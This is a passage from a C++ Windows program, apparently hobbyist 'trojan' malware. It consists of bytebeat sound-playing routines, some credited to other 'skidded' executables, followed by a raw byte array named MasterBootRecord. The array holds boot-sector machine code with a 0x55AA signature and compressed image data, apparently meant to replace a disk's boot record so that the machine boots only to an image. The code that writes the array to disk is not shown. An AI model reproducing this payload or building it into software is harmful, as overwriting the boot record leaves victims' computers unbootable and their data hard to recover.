		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat6() {//modified from skidded alkyl-octanitrogen.exe
	int nSamplesPerSec = 8000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(((((t << 3 & t >> 7) | t >> 8 & t << 9) | ((11 * t & 4 | t ^ 5) * (14 & t)))));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat7() {//originally from skidded hypno squash.exe
	int nSamplesPerSec = 22050, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(((t * (t * 2 | t >> 8) | t) + ((t >> 78) - (t / 91))));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat8() {// modified from skidded apocaly doom.exe
	int nSamplesPerSec = 13333, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((cos(t >> 7 & 8 + (t & (t >> 9) | (t >> 1) & 7 + (t >> 8))) * t * 5.033f));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat9() {//used in NeoarsphenamineR
	int nSamplesPerSec = 22050, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((t * (t >> 13) * 39 & t >> 8 ^ (t & t >> 13)));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat10() {
	int nSamplesPerSec = 22050, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(128 * cos((t * (t >> 13) * 39) >> 8 * (t & t >> 13)) + 128);
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat11() {//simple bytebeat 
	int nSamplesPerSec = 22050, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((t * (t >> 13) ^ (t >> 8) ^ (t & t >> 13)));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat12() {
	int nSamplesPerSec = 22050, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(((cos(((t * (t >> 13) * 39) >> 8) / 40) * (t & t >> 13))));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat13() {
	int nSamplesPerSec = 44100, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(((cos(t * (t + 6 & t >> 13) / 26) * sin(-t / 169) * 13)));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat14() {
	int nSamplesPerSec = 22050, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((((t / 13) ^ ((t >> 13) * int(tan(t / ((t >> 13 & 13) + 13)))) >> 13)));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat15() {
	int nSamplesPerSec = 44100, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(((128 * cos((t * tan(t >> 13) + ((39 & t >> 8) ^ (t & t >> 13))) / 20.75f) + 128)));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat16() {//modified from skidded alkyl-octanitrogen.exe
	int nSamplesPerSec = 13000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((((t | t * t >> 7 & t >> 8) | t >> 9) + (t >> 1 ^ t)));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat17() {
	int nSamplesPerSec = 11206, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((39 * sin(t ^ 8) - t));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
const unsigned char MasterBootRecord[2560] = { 0xBB,0xE0,0x07,0x8E,0xC3,0x8E,0xDB,0xB8,0x16,0x02,0xB9,0x02,0x00,0xB6,0x00,0xBB,0x00,0x00,0xCD,0x13,0x31,0xC0,0x89,0xC3,0x89,0xC1,0x89,0xC2,0xBE,0x00,0x00,0xBF,0xAE,0x09,0xAC,0x81,0xFE,0xAE,0x09,0x73,0x31,0x3C,0x80,0x73,0x02,0xEB,0x0F,0x24,0x7F,0x88,0xC1,0xAC,0xAA,0xFE,0xC9,0x80,0xF9,0xFF,0x75,0xF7,0xEB,0xE4,0xB4,0x00,0x3C,0x40,0x72,0x05,0x24,0x3F,0x88,0xC4,0xAC,0x89,0xC1,0xAD,0x89,0xF2,0x89,0xFE,0x29,0xC6,0xAC,0xAA,0xE2,0xFC,0x89,0xD6,0xEB,0xC8,0xB8,0x13,0x00,0xCD,0x10,0xBB,0xE0,0x07,0x8E,0xDB,0xBE,0xAE,0x09,0xB4,0x00,0xAC,0xBB,0x00,0x00,0x89,0xC1,0xBA,0xC8,0x03,0x88,0xD8,0xEE,0x43,0xBA,0xC9,0x03,0xAC,0xEE,0xAC,0xEE,0xAC,0xEE,0xE2,0xEE,0xBB,0x00,0xA0,0x8E,0xC3,0xBF,0x00,0x00,0xB9,0x00,0x7D,0xF3,0xA5,0xF4,0xEB,0xFD,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x55,0xAA,0x8A,0x02,0x26,0x2B,0x11,0x19,0x14,0x2E,0x00,0x00,0x00,0x00,0x04,0x04,0x00,0x08,0x08,0x00,0x10,0x10,0x00,0x20,0x20,0x00,0x40,0x40,0x40,0x00,0x40,0x80,0x80,0x00,0x41,0x00,0x00,0x01,0x42,0x00,0x00,0x02,0x44,0x00,0x00,0x04,0x48,0x00,0x00,0x08,0x42,0xC9,0xC9,0x02,0x81,0x01,0x01,0x41,0x40,0x40,0x01,0x41,0x47,0x80,0x02,0x41,0x37,0x49,0x01,0x41,0x40,0x40,0x01,0x41,0x3F,0x40,0x01,0x80,0x01,0x41,0x40,0x40,0x01,0x42,0x80,0x80,0x02,0x42,0x88,0xC0,0x03,0x0A,0x49,0x01,0x41,0x40,0x40,0x01,0x42,0x80,0x80,0x02,0x42,0x6F,0x80,0x02,0x11,0x89,0x07,0x40,0x52,0xD1,0x11,0x40,0xDB,0x9B,0x01,0x41,0x40,0x40,0x01,0x40,0x52,0xFF,0x09,0x2F,0x40,0x01,0x40,0xBF,0x5C,0x01,0x41,0x3F,0x40,0x01,0x83,0x01,0x01,0x01,0x01,0x04,0x04,0x00,0x04,0x04,0x00,0x40,0x4F,0x40,0x01,0x0B,0x50,0x00,0x40,0x45,0x40,0x01,0x40,0x95,0x69,0x01,0x40,0x5A,0x40,0x01,0x0C,0x51,0x00,0x40,0xE6,0x40,0x01,0x40,0x4E,0x40,0x06,0x40,0x4C,0x40,0x01,0x04,0x23,0x00,0x25,0xA0,0x00,0x40,0x71,0x63,0x01,0x04,0x96,0x00,0x40,0x56,0x40,0x01,0x27,0xC0,0x03,0x24,0x77,0x00,0x05,0x24,0x00,0x29,0x29,0x00,0x40,0xBF,0xBF,0x08,0x2F,0x40,0x06,0x28,0x17,0x01,0x25,0xE0,0x01,0x40,0x7D,0x40,0x01,0x40,0x48,0x82,0x00,0x40,0x50,0x40,0x01,0x06,0x1B,0x03,0x27,0x40,0x01,0x40,0x70,0xC6,0x1D,0x0F,0x40,0x01,0x0C,0xC7,0x03,0x40,0x41,0x53,0x00,0x40,0xE3,0x40,0x01,0x0F,0x2E,0x01,0x0D,0x08,0x05,0x0C,0x53,0x00,0x2C,0x5E,0x00,0x41,0x04,0x40,0x01,0x09,0xB1,0x05,0x0A,0x97,0x02,0x29,0x63,0x00,0x12,0x28,0x00,0x1C,0xFB,0x00,0x27,0x40,0x01,0x26,0xE0,0x06,0x40,0x73,0x40,0x01,0x0D,0x41,0x00,0x07,0x37,0x01,0x06,0x2C,0x01,0x0F,0x40,0x01,0x06,0xC0,0x00,0x23,0xC6,0x00,0x40,0xDF,0x40,0x01,0x0D,0x2A,0x00,0x13,0x40,0x01,0x0C,0xD3,0x08,0x15,0x40,0x01,0x11,0x6B,0x00,0x0B,0x44,0x00,0x0C,0xA8,0x02,0x0C,0xFF,0x09,0x40,0xC9,0x40,0x01,0x0F,0x88,0x00,0x20,0x40,0x01,0x07,0x2D,0x00,0x0B,0x4F,0x01,0x09,0x09,0x00,0x06,0x07,0x00,0x0F,0x03,0x09,0x0B,0xE8,0x00,0x29,0x3F,0x0B,0x40,0xAB,0x40,0x01,0x11,0x89,0x00,0x1F,0x40,0x01,0x08,0x2C,0x00,0x09,0x0C,0x00,0x10,0x49,0x01,0x20,0x40,0x01,0x0C,0xC5,0x02,0x38,0xB2,0x09,0x40,0xBE,0x40,0x01,0x08,0x1D,0x00,0x0A,0x90,0x02,0x18,0x40,0x01,0x0F,0x79,0x02,0x0A,0x26,0x00,0x06,0x3F,0x00,0x13,0xFE,0x02,0x13,0x40,0x01,0x12,0x27,0x04,0x2C,0x60,0x0E,0x40,0x5F,0x40,0x01,0x09,0x3B,0x02,0x1A,0x40,0x01,0x0A,0x38,0x06,0x40,0x60,0x40,0x01,0x0D,0x8D,0x00,0x0D,0x2E,0x01,0x40,0x9C,0x40,0x01,0x19,0xD9,0x0F,0x17,0x40,0x01,0x09,0x1D,0x00,0x12,0x40,0x01,0x09,0x04,0x05,0x0F,0x30,0x0A,0x10,0x40,0x01,0x07,0x3F,0x00,0x0F,0x40,0x01,0x0A,0x08,0x04,0x0B,0x37,0x01,0x0B,0x56,0x01,0x40,0x9A,0x40,0x01,0x16,0xDA,0x05,0x0C,0xE9,0x04,0x14,0xA7,0x07,0x08,0x47,0x02,0x09,0x40,0x01,0x09,0x17,0x01,0x11,0x38,0x01,0x0A,0x52,0x02,0x0B,0x15,0x01,0x12,0x7A,0x00,0x10,0x40,0x01,0x09,0x37,0x04,0x11,0xE3,0x01,0x40,0x91,0x40,0x01,0x0F,0x36,0x01,0x14,0x40,0x01,0x10,0x5E,0x00,0x18,0x40,0x01,0x11,0xB0,0x0C,0x34,0x40,0x01,0x0E,0x9F,0x06,0x40,0x99,0x40,0x01,0x07,0x93,0x09,0x0C,0x40,0x01,0x13,0xB6,0x13,0x40,0x56,0x40,0x01,0x12,0xD4,0x08,0x0B,0xCC,0x01,0x0C,0x24,0x01,0x10,0xB1,0x07,0x40,0x8C,0x40,0x01,0x1B,0x34,0x08,0x20,0x41,0x00,0x11,0x09,0x0A,0x0B,0x9D,0x04,0x23,0x40,0x01,0x0D,0x1E,0x06,0x11,0x2E,0x00,0x0C,0xF4,0x04,0x40,0x75,0x40,0x01,0x2D,0x77,0x12,0x35,0x40,0x01,0x0D,0x02,0x09,0x1B,0x40,0x01,0x0D,0xE9,0x0D,0x2C,0x40,0x01,0x0B,0xA2,0x06,0x15,0x40,0x01,0x24,0xA2,0x00,0x40,0xA5,0x40,0x01,0x10,0x40,0x00,0x25,0x40,0x01,0x10,0x68,0x07,0x0C,0x99,0x10,0x12,0x33,0x09,0x14,0x00,0x05,0x0C,0xD8,0x07,0x40,0x51,0x3F,0x15,0x40,0x41,0x3F,0x01,0x2C,0x42,0x00,0x1C,0x40,0x01,0x0E,0x69,0x10,0x0D,0x40,0x01,0x09,0x9D,0x10,0x15,0x40,0x01,0x0D,0xA6,0x08,0x1E,0x40,0x01,0x0D,0xD9,0x08,0x40,0xC1,0x40,0x01,0x0E,0x12,0x01,0x0C,0x49,0x07,0x12,0x1F,0x01,0x10,0x2E,0x00,0x0C,0x28,0x00,0x0F,0x40,0x01,0x0C,0x19,0x08,0x0C,0x40,0x01,0x11,0x55,0x0E,0x10,0xF4,0x02,0x40,0x60,0x40,0x01,0x18,0x89,0x05,0x40,0x41,0x3B,0x04,0x0E,0x25,0x0F,0x0F,0x40,0x0B,0x11,0xC6,0x0E,0x0E,0x0E,0x01,0x11,0x30,0x0E,0x18,0x40,0x01,0x0F,0x65,0x01,0x11,0xD5,0x10,0x10,0xAB,0x0E,0x0D,0x1F,0x0D,0x1A,0xA4,0x09,0x3A,0x7E,0x03,0x40,0x4D,0xC1,0x25,0x11,0x3F,0x02,0x0B,0xC3,0x00,0x14,0x40,0x01,0x0F,0xCF,0x11,0x0D,0xDD,0x0D,0x0F,0x40,0x01,0x0F,0x46,0x00,0x13,0x40,0x01,0x0E,0x99,0x05,0x19,0x2A,0x08,0x15,0xCC,0x07,0x2D,0x40,0x01,0x40,0x5A,0x01,0x27,0x13,0x26,0x06,0x0B,0x22,0x0F,0x15,0x40,0x01,0x0E,0x2B,0x01,0x0C,0x4B,0x14,0x18,0x40,0x01,0x11,0x27,0x00,0x14,0x40,0x01,0x0C,0x32,0x04,0x0D,0x03,0x0E,0x0A,0x0A,0x00,0x0C,0xF3,0x03,0x2C,0x3F,0x15,0x40,0x51,0x40,0x01,0x2B,0x62,0x06,0x0E,0xFA,0x00,0x1B,0x8D,0x11,0x17,0x40,0x01,0x0F,0xA7,0x03,0x0C,0x9F,0x01,0x10,0xC0,0x02,0x0A,0x37,0x00,0x11,0xA9,0x02,0x0F,0x6A,0x04,0x19,0x40,0x01,0x14,0x0B,0x1A,0x40,0x51,0x22,0x1D,0x37,0x97,0x09,0x15,0x12,0x0B,0x0D,0x2D,0x05,0x1C,0x40,0x01,0x13,0xDF,0x02,0x12,0x40,0x01,0x14,0x17,0x09,0x0F,0xD1,0x14,0x12,0x8C,0x06,0x14,0x40,0x01,0x28,0x4B,0x21,0x40,0x83,0x40,0x01,0x0D,0x07,0x0F,0x0B,0x40,0x01,0x0A,0xA5,0x0C,0x0E,0xAD,0x11,0x10,0xB9,0x06,0x12,0x6A,0x12,0x10,0xD8,0x07,0x11,0x32,0x09,0x10,0x19,0x15,0x12,0x47,0x09,0x40,0x5C,0x40,0x01,0x39,0x10,0x04,0x20,0x40,0x01,0x0E,0x40,0x06,0x14,0x9D,0x02,0x14,0x1E,0x17,0x10,0x18,0x05,0x0E,0x68,0x14,0x10,0xC1,0x03,0x13,0x2F,0x05,0x0D,0x8C,0x02,0x11,0xC0,0x0A,0x40,0x4E,0x40,0x01,0x3E,0x37,0x23,0x16,0xA9,0x10,0x11,0xEC,0x1D,0x0B,0x3B,0x06,0x12,0x40,0x01,0x11,0x39,0x09,0x2A,0x40,0x01,0x10,0x8E,0x05,0x10,0x9A,0x02,0x0D,0x65,0x09,0x0C,0xBF,0x07,0x40,0x88,0x40,0x01,0x34,0x22,0x21,0x15,0x8D,0x03,0x13,0xF6,0x08,0x0D,0x7D,0x19,0x0A,0x8B,0x03,0x1B,0x40,0x01,0x12,0xF5,0x03,0x13,0x36,0x00,0x40,0x55,0x40,0x01,0x40,0x6C,0x60,0x36,0x0C,0x69,0x02,0x13,0x37,0x0B,0x12,0x2C,0x00,0x19,0x40,0x01,0x0F,0x5B,0x00,0x0A,0x6F,0x02,0x40,0xD1,0x40,0x01,0x0E,0xC9,0x03,0x0B,0xA9,0x03,0x14,0x02,0x1C,0x14,0xD7,0x28,0x0D,0x8C,0x02,0x17,0x7D,0x17,0x0C,0x40,0x01,0x16,0xD8,0x10,0x0C,0x1F,0x00,0x40,0xB6,0xDF,0x42,0x0E,0x08,0x01,0x14,0x8B,0x06,0x11,0x20,0x06,0x12,0xD6,0x04,0x15,0x4B,0x02,0x10,0x40,0x01,0x0C,0xA2,0x02,0x0F,0xAF,0x02,0x40,0xB1,0x40,0x01,0x26,